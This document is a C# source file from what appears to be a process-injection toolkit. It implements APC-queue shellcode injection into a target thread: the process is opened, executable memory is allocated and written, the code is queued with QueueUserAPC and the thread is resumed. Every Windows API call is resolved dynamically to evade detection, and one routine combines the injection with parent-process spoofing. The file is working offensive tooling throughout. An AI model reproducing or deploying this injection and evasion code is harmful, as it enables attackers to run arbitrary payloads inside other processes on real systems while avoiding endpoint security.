using ProcessInjection.Native;
using System;
using System.Runtime.InteropServices;
using static ProcessInjection.Utils.Utils;
using static ProcessInjection.Native.Enum;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Delegates;
using static ProcessInjection.Native.Constants;

namespace ProcessInjection.DInvoke
{
    public class APCQueue
    {

        public static void DynamicAPCInject(int pid, int threadid, byte[] buf)
        {
            uint lpNumberOfBytesWritten = 0;

            try
            {
                PrintInfo($"[+] Obtaining the handle for the process id {pid}.");
                var funcParams = new object[] {
                    (uint)ProcessAccessRights.All,
                    false,
                    (uint)pid
                };

                var pHandle = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "OpenProcess",
                    typeof(OpenProcess),
                    ref funcParams,
                    true);

                PrintInfo($"[+] Handle {pHandle} opened for the process id {pid}.");

                PrintInfo($"[+] Allocating memory to inject the shellcode.");

                funcParams = new object[] {
                    pHandle,
                    IntPtr.Zero,
                    (uint)buf.Length,
                    (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, 
                    (uint)MemProtect.PAGE_EXECUTE_READWRITE
                };

                var rMemAddress = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "VirtualAllocEx",
                    typeof(VirtualAllocEx),
                    ref funcParams,
                    true);

                PrintInfo($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");


                PrintInfo($"[+] Writing the shellcode at the allocated memory location.");

                funcParams = new object[] {
                    pHandle,
                    rMemAddress,
                    buf,
                    (uint)buf.Length,
                    lpNumberOfBytesWritten
                };

                var status = (bool)DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "WriteProcessMemory",
                    typeof(WriteProcessMemory),
                    ref funcParams,
                    true);

                if (status)
                {
                    PrintInfo($"[+] Shellcode written in the process memory.");

                    funcParams = new object[] {
                        ThreadAccess.THREAD_ALL,
                        false, 
                        (uint)threadid
                    };

                    var tHandle = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "OpenThread",
                        typeof(OpenThread),
                        ref funcParams,
                        true);

                    PrintInfo($"[!] Add the thread {tHandle} to queue for execution when it enters an alertable state.");

                    funcParams = new object[] {
                        rMemAddress, 
                        tHandle, 
                        IntPtr.Zero
                    };

                    var ptr = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "QueueUserAPC",
                        typeof(QueueUserAPC),
                        ref funcParams,
                        true);

                    PrintInfo($"[!] Resume the thread {tHandle}");

                    funcParams = new object[] {
                        tHandle
                    };

                    DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "ResumeThread",
                        typeof(ResumeThread),
                        ref funcParams,
                        true);

                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    PrintError($"[+] Failed to write the shellcode into the memory of the process id {pid}.");
                }

                funcParams = new object[] {
                    pHandle
                    };

                var closed = DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "CloseHandle",
                    typeof(CloseHandle),
                    ref funcParams,
                    true);
            }
            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }
        }

        public static void PPIDDynAPCInject(string binary, byte[] shellcode, int parentpid)
        {
            DynamicPPIDSpoofing Parent = new DynamicPPIDSpoofing();
            Structs.PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
            DynamicAPCInject(pinf.dwProcessId, pinf.dwThreadId, shellcode);
        }


        public static Structs.PROCESS_INFORMATION StartProcess(string binaryPath)
        {

            var procInfo = new Structs.PROCESS_INFORMATION();

            var siEx = new STARTUPINFOEX();

            var ps = new SECURITY_ATTRIBUTES();
            var ts = new SECURITY_ATTRIBUTES();

            var funcParams = new object[]
                {
                    null,
                    binaryPath,
                    ps,
                    ts,
                    false,
                    CreateSuspended,
                    IntPtr.Zero,
                    null,
                    siEx,
                    procInfo
                };

            DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "CreateProcessA",
                typeof(CreateProcess),
                ref funcParams,
                true);

            procInfo = (PROCESS_INFORMATION)funcParams[9];

            PrintInfo($"[!] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");

            return procInfo;
        }
    }
}
